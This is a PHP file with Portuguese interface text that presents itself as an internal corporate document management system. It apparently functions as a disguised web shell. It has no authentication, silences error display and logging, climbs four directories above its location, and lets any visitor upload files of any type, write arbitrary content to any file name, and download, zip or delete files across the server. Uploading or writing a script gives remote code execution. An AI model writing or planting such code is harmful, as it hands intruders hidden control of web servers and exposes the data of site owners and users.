<?php
/**
 * File Management System v3.5.2
 * 
 * Sistema corporativo para gerenciamento de documentos e backups
 * Desenvolvido para uso interno
 */

// ==============================================
// CONFIGURAÇÕES DE SEGURANÇA
// ==============================================
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);

// ==============================================
// FUNÇÕES PRINCIPAIS
// ==============================================
class DocumentManager {
    private $basePath;
    private $currentPath;
    
    public function __construct() {
        $this->initializePaths();
        $this->processRequest();
    }
    
    private function initializePaths() {
        $this->basePath = realpath(__DIR__ . '/../../../../');
        if (!$this->basePath) {
            $this->terminateWithError('Sistema não configurado corretamente');
        }
        
        $this->currentPath = $this->basePath;
        if (isset($_GET['path']) && is_string($_GET['path'])) {
            $requestedPath = realpath($this->basePath . '/' . trim($_GET['path'], '/\\'));
            if ($requestedPath && strpos($requestedPath, $this->basePath) === 0) {
                $this->currentPath = $requestedPath;
            }
        }
    }
    
    private function processRequest() {
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $this->handlePostRequest();
        } else {
            $this->handleGetRequest();
        }
    }
    
    private function handlePostRequest() {
        if (isset($_FILES['document_upload'])) {
            $this->uploadDocument();
        } elseif (isset($_POST['folder_name'])) {
            $this->createFolder();
        } elseif (isset($_POST['file_content'])) {
            $this->saveFileContent();
        } elseif (isset($_POST['items_to_delete'])) {
            $this->deleteItems();
        } elseif (isset($_POST['archive_name'])) {
            $this->createArchive();
        }
    }
    
    private function handleGetRequest() {
        if (isset($_GET['download'])) {
            $this->downloadFile();
        } elseif (isset($_GET['preview'])) {
            $this->previewFile();
        }
    }
    
    // ==============================================
    // OPERAÇÕES DE ARQUIVOS
    // ==============================================
    
    private function uploadDocument() {
        $targetFile = $this->currentPath . '/' . basename($_FILES['document_upload']['name']);
        
        if (move_uploaded_file($_FILES['document_upload']['tmp_name'], $targetFile)) {
            $this->redirect();
        }
    }
    
    private function createFolder() {
        $folderName = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['folder_name']);
        $newFolder = $this->currentPath . '/' . $folderName;
        
        if (!file_exists($newFolder)) {
            mkdir($newFolder, 0755);
            $this->redirect();
        }
    }
    
    private function saveFileContent() {
        $filePath = $this->currentPath . '/' . basename($_POST['file_name']);
        file_put_contents($filePath, $_POST['file_content']);
        $this->redirect();
    }
    
    private function deleteItems() {
        foreach ($_POST['items_to_delete'] as $item) {
            $target = $this->currentPath . '/' . $this->sanitizeName($item);
            if (is_dir($target)) {
                $this->deleteDirectory($target);
            } else {
                unlink($target);
            }
        }
        $this->redirect();
    }
    
    private function createArchive() {
        $archiveName = $this->sanitizeName($_POST['archive_name']) . '.zip';
        $archivePath = $this->currentPath . '/' . $archiveName;
        
        $zip = new ZipArchive();
        if ($zip->open($archivePath, ZipArchive::CREATE) === TRUE) {
            foreach ($_POST['items_to_archive'] as $item) {
                $itemPath = $this->currentPath . '/' . $this->sanitizeName($item);
                if (is_dir($itemPath)) {
                    $this->addFolderToZip($zip, $itemPath);
                } else {
                    $zip->addFile($itemPath, basename($itemPath));
                }
            }
            $zip->close();
            $this->redirect();
        }
    }
    
    private function downloadFile() {
        $filePath = $this->currentPath . '/' . $this->sanitizeName($_GET['download']);
        
        if (file_exists($filePath)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
            header('Content-Length: ' . filesize($filePath));
            readfile($filePath);
            exit;
        }
    }
    
    // ==============================================
    // MÉTODOS AUXILIARES
    // ==============================================
    
    private function sanitizeName($name) {
        return preg_replace('/[^a-zA-Z0-9_.-]/', '', $name);
    }
    
    private function deleteDirectory($dir) {
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            is_dir($path) ? $this->deleteDirectory($path) : unlink($path);
        }
        return rmdir($dir);
    }
    
    private function addFolderToZip($zip, $folder, $parent = '') {
        $files = array_diff(scandir($folder), ['.', '..']);
        
        foreach ($files as $file) {
            $path = $folder . '/' . $file;
            $localPath = $parent ? $parent . '/' . $file : $file;
            
            if (is_dir($path)) {
                $zip->addEmptyDir($localPath);
                $this->addFolderToZip($zip, $path, $localPath);
            } else {
                $zip->addFile($path, $localPath);
            }
        }
    }
    
    private function redirect() {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(str_replace($this->basePath, '', $this->currentPath)));
        exit;
    }
    
    private function terminateWithError($message) {
        die('<div class="system-error">' . htmlspecialchars($message) . '</div>');
    }
    
    // ==============================================
    // RENDERIZAÇÃO DA INTERFACE
    // ==============================================
    
    public function renderInterface() {
        $items = $this->getDirectoryItems();
        $parentPath = dirname(str_replace($this->basePath, '', $this->currentPath));
        
        echo '<div class="document-manager">';
        echo '<div class="header">';
        echo '<h1><i class="icon-folder"></i> ' . htmlspecialchars(basename($this->currentPath)) . '</h1>';
        echo '<div class="breadcrumb">' . $this->renderBreadcrumb() . '</div>';
        echo '</div>';
        
        echo '<div class="toolbar">';
        echo $this->renderUploadForm();
        echo $this->renderCreateFolderForm();
        echo $this->renderArchiveForm($items);
        echo '</div>';
        
        echo '<form method="post" class="file-list-form">';
        echo $this->renderFileList($items);
        echo '<div class="actions"><button type="submit" name="delete_action">Excluir Selecionados</button></div>';
        echo '</form>';
        
        if (isset($_GET['edit'])) {
            echo $this->renderEditor();
        }
        
        echo '</div>';
    }
    
    private function getDirectoryItems() {
        $items = [];
        $files = array_diff(scandir($this->currentPath), ['.', '..']);
        
        foreach ($files as $file) {
            $path = $this->currentPath . '/' . $file;
            $items[] = [
                'name' => $file,
                'path' => $path,
                'is_dir' => is_dir($path),
                'size' => is_dir($path) ? 0 : filesize($path),
                'modified' => filemtime($path),
                'icon' => $this->getFileIcon($file)
            ];
        }
        
        usort($items, function($a, $b) {
            if ($a['is_dir'] == $b['is_dir']) {
                return strcmp($a['name'], $b['name']);
            }
            return $a['is_dir'] ? -1 : 1;
        });
        
        return $items;
    }
    
    private function getFileIcon($filename) {
        $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $icons = [
            'pdf' => 'icon-pdf',
            'doc' => 'icon-word',
            'docx' => 'icon-word',
            'xls' => 'icon-excel',
            'xlsx' => 'icon-excel',
            'jpg' => 'icon-image',
            'jpeg' => 'icon-image',
            'png' => 'icon-image',
            'gif' => 'icon-image',
            'zip' => 'icon-zip',
            'rar' => 'icon-zip'
        ];
        
        return $icons[$extension] ?? (strpos($filename, '.') ? 'icon-file' : 'icon-folder');
    }
    
    private function renderBreadcrumb() {
        $relativePath = str_replace($this->basePath, '', $this->currentPath);
        $parts = array_filter(explode('/', $relativePath));
        $breadcrumb = [];
        $currentPath = '';
        
        $breadcrumb[] = '<a href="?path="><i class="icon-home"></i> Root</a>';
        
        foreach ($parts as $part) {
            $currentPath .= '/' . $part;
            $breadcrumb[] = '<a href="?path=' . urlencode($currentPath) . '">' . htmlspecialchars($part) . '</a>';
        }
        
        return implode(' <i class="icon-arrow"></i> ', $breadcrumb);
    }
    
    private function renderUploadForm() {
        return '
        <form method="post" enctype="multipart/form-data" class="upload-form">
            <input type="file" name="document_upload" id="file-upload" style="display:none">
            <label for="file-upload" class="button"><i class="icon-upload"></i> Enviar Arquivo</label>
            <button type="submit" name="upload_action"><i class="icon-check"></i></button>
        </form>';
    }
    
    private function renderCreateFolderForm() {
        return '
        <form method="post" class="folder-form">
            <input type="text" name="folder_name" placeholder="Nome da pasta" required>
            <button type="submit" name="create_folder"><i class="icon-folder-plus"></i> Criar Pasta</button>
        </form>';
    }
    
    private function renderArchiveForm($items) {
        $options = '';
        foreach ($items as $item) {
            $options .= '<option value="' . htmlspecialchars($item['name']) . '">' . htmlspecialchars($item['name']) . '</option>';
        }
        
        return '
        <form method="post" class="archive-form">
            <select name="items_to_archive[]" multiple style="display:none" id="archive-items">
                ' . $options . '
            </select>
            <input type="text" name="archive_name" placeholder="Nome do arquivo" required>
            <button type="submit" name="create_archive"><i class="icon-zip"></i> Criar ZIP</button>
        </form>';
    }
    
    private function renderFileList($items) {
        $html = '<table class="file-list">
            <thead>
                <tr>
                    <th><input type="checkbox" id="select-all"></th>
                    <th>Nome</th>
                    <th>Tamanho</th>
                    <th>Modificado</th>
                    <th>Ações</th>
                </tr>
            </thead>
            <tbody>';
        
        foreach ($items as $item) {
            $size = $item['is_dir'] ? '-' : $this->formatSize($item['size']);
            $modified = date('d/m/Y H:i', $item['modified']);
            $actions = $this->renderItemActions($item);
            
            $html .= '
                <tr>
                    <td><input type="checkbox" name="items_to_delete[]" value="' . htmlspecialchars($item['name']) . '"></td>
                    <td>
                        <i class="' . $item['icon'] . '"></i>
                        ' . $this->renderItemLink($item) . '
                    </td>
                    <td>' . $size . '</td>
                    <td>' . $modified . '</td>
                    <td>' . $actions . '</td>
                </tr>';
        }
        
        $html .= '</tbody></table>';
        return $html;
    }
    
    private function formatSize($bytes) {
        if ($bytes >= 1073741824) {
            return number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            return number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            return number_format($bytes / 1024, 2) . ' KB';
        } else {
            return $bytes . ' bytes';
        }
    }
    
    private function renderItemLink($item) {
        if ($item['is_dir']) {
            return '<a href="?path=' . urlencode(str_replace($this->basePath, '', $item['path'])) . '">' . htmlspecialchars($item['name']) . '</a>';
        } else {
            return '<a href="?path=' . urlencode(str_replace($this->basePath, '', dirname($item['path']))) . '&preview=' . urlencode($item['name']) . '">' . htmlspecialchars($item['name']) . '</a>';
        }
    }
    
    private function renderItemActions($item) {
        $actions = [];
        
        if (!$item['is_dir']) {
            $actions[] = '<a href="?path=' . urlencode(str_replace($this->basePath, '', dirname($item['path']))) . '&download=' . urlencode($item['name']) . '"><i class="icon-download"></i></a>';
            $actions[] = '<a href="?path=' . urlencode(str_replace($this->basePath, '', dirname($item['path']))) . '&edit=' . urlencode($item['name']) . '"><i class="icon-edit"></i></a>';
        }
        
        $actions[] = '<button type="submit" name="delete_action" value="' . htmlspecialchars($item['name']) . '"><i class="icon-trash"></i></button>';
        
        return implode(' ', $actions);
    }
    
    private function renderEditor() {
        $filePath = $this->currentPath . '/' . $this->sanitizeName($_GET['edit']);
        $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : '';
        
        return '
        <div class="editor-modal">
            <form method="post">
                <input type="hidden" name="file_name" value="' . htmlspecialchars($_GET['edit']) . '">
                <textarea name="file_content" class="code-editor">' . $content . '</textarea>
                <div class="editor-actions">
                    <button type="submit" name="save_action"><i class="icon-save"></i> Salvar</button>
                    <a href="?path=' . urlencode(str_replace($this->basePath, '', $this->currentPath)) . '" class="button"><i class="icon-close"></i> Cancelar</a>
                </div>
            </form>
        </div>';
    }
}

// ==============================================
// INICIALIZAÇÃO DO SISTEMA
// ==============================================

$documentManager = new DocumentManager();

?><!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema de Gerenciamento de Documentos</title>
    <style>
        /* Reset básico */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f7fa;
            padding: 20px;
        }
        
        /* Layout principal */
        .document-manager {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            padding: 20px;
            border-bottom: 1px solid #e1e5eb;
            background: linear-gradient(to right, #f8f9fa, #ffffff);
        }
        
        .header h1 {
            color: #2c3e50;
            font-size: 1.8rem;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .breadcrumb {
            font-size: 0.9rem;
            color: #7f8c8d;
        }
        
        .breadcrumb a {
            color: #3498db;
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        /* Barra de ferramentas */
        .toolbar {
            padding: 15px 20px;
            background: #f8f9fa;
            border-bottom: 1px solid #e1e5eb;
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            align-items: center;
        }
        
        .upload-form, .folder-form, .archive-form {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        /* Lista de arquivos */
        .file-list-form {
            padding: 20px;
        }
        
        .file-list {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.95rem;
        }
        
        .file-list th, .file-list td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e1e5eb;
        }
        
        .file-list th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: #2c3e50;
        }
        
        .file-list tr:hover {
            background-color: #f8f9fa;
        }
        
        /* Formulários e inputs */
        input[type="text"], 
        input[type="file"], 
        input[type="checkbox"],
        textarea,
        select {
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 0.95rem;
        }
        
        input[type="text"] {
            min-width: 200px;
        }
        
        textarea.code-editor {
            width: 100%;
            min-height: 400px;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            padding: 15px;
            background: #f8f9fa;
            border: 1px solid #e1e5eb;
        }
        
        /* Botões */
        .button, button {
            padding: 8px 16px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.95rem;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            transition: background-color 0.2s;
        }
        
        button:hover, .button:hover {
            background-color: #2980b9;
        }
        
        button[type="submit"] {
            background-color: #2ecc71;
        }
        
        button[type="submit"]:hover {
            background-color: #27ae60;
        }
        
        /* Ícones */
        [class^="icon-"] {
            font-style: normal;
        }
        
        .icon-folder:before { content: "📁"; }
        .icon-file:before { content: "📄"; }
        .icon-pdf:before { content: "📕"; }
        .icon-word:before { content: "📘"; }
        .icon-excel:before { content: "📗"; }
        .icon-image:before { content: "🖼️"; }
        .icon-zip:before { content: "🗜️"; }
        .icon-upload:before { content: "⬆️"; }
        .icon-download:before { content: "⬇️"; }
        .icon-edit:before { content: "✏️"; }
        .icon-trash:before { content: "🗑️"; }
        .icon-save:before { content: "💾"; }
        .icon-close:before { content: "✕"; }
        .icon-check:before { content: "✓"; }
        .icon-folder-plus:before { content: "📂"; }
        .icon-home:before { content: "⌂"; }
        .icon-arrow:before { content: "›"; }
        
        /* Modal do editor */
        .editor-modal {
            padding: 20px;
            border-top: 1px solid #e1e5eb;
            background: #f8f9fa;
        }
        
        .editor-actions {
            margin-top: 15px;
            display: flex;
            gap: 10px;
        }
        
        /* Responsividade */
        @media (max-width: 768px) {
            .toolbar {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .upload-form, .folder-form, .archive-form {
                width: 100%;
            }
            
            .file-list th, .file-list td {
                padding: 8px 10px;
                font-size: 0.85rem;
            }
        }
    </style>
</head>
<body>
    <?php $documentManager->renderInterface(); ?>
    
    <script>
    // Scripts básicos para melhorar a usabilidade
    document.addEventListener('DOMContentLoaded', function() {
        // Selecionar todos os itens
        document.getElementById('select-all').addEventListener('change', function(e) {
            document.querySelectorAll('input[name="items_to_delete[]"]').forEach(function(checkbox) {
                checkbox.checked = e.target.checked;
            });
        });
        
        // Confirmar ações importantes
        document.querySelectorAll('button[type="submit"]').forEach(function(button) {
            button.addEventListener('click', function(e) {
                if (button.name === 'delete_action' || button.name === 'delete_action') {
                    if (!confirm('Tem certeza que deseja excluir os itens selecionados?')) {
                        e.preventDefault();
                    }
                }
            });
        });
        
        // Melhorar o formulário de upload
        document.getElementById('file-upload').addEventListener('change', function() {
            if (this.files.length > 0) {
                this.form.submit();
            }
        });
    });
    </script>
</body>
</html>